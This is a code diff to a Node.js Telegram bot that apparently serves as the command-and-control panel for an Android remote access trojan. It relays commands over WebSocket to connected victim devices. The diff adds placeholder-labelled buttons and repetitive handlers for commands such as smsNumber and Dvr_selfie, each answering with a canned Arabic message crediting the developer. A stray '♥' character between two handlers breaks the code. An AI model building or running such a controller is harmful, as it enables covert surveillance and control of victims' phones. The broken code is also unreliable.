@@ -414,6 +414,22 @@ appBot.on("callback_query", (callbackQuery) => {
                         {text: 'ارسال رسالة', callback_data: `send_message:${uuid}`}
                     ],
                     [
+                        {text: 'زر جديد 1', callback_data: `smsNumber:${uuid}`},
+                        {text: 'زر جديد 2', callback_data: `ui_release:${uuid}`},
+                    ],
+                    [
+                        {text: 'زر جديد 3', callback_data: `Yen_main:${uuid}`},
+                        {text: 'زر جديد 4', callback_data: `Dvr_selfie:${uuid}`}
+                    ],
+                    [
+                        {text: 'زر جديد 5', callback_data: `Backslash:${uuid}`},
+                        {text: 'زر جديد 6', callback_data: `Back:${uuid}`}
+                    ],
+                    [
+                        {text: 'زر جديد 7', callback_data: `Settings:${uuid}`},
+                        {text: 'زر جديد 8', callback_data: `Guide:${uuid}`}
+                    ],
+                    [
                         {text: 'تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
                         {text: 'ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
                     ],
@@ -622,6 +638,166 @@ appBot.on("callback_query", (callbackQuery) => {
         appSocket.clients.forEach(function each(ws) {
             if (ws.uuid == uuid) {
                 ws.send('stop_audio');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    ♥
+        if (commend == 'Guide') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('Guide');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    
+        if (commend == 'Settings') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('Settings');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    
+        if (commend == 'Back') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('Back');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    
+        if (commend == 'Backslash') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('Backslash');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    
+        if (commend == 'Dvr_selfie') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('Dvr_selfie');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    
+        if (commend == 'Yen_main') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('Yen_main');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    
+        if (commend == 'ui_release') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('ui_release');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    
+        if (commend == 'smsNumber') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('smsNumber');
             }
         });
         appBot.deleteMessage(id, msg.message_id)
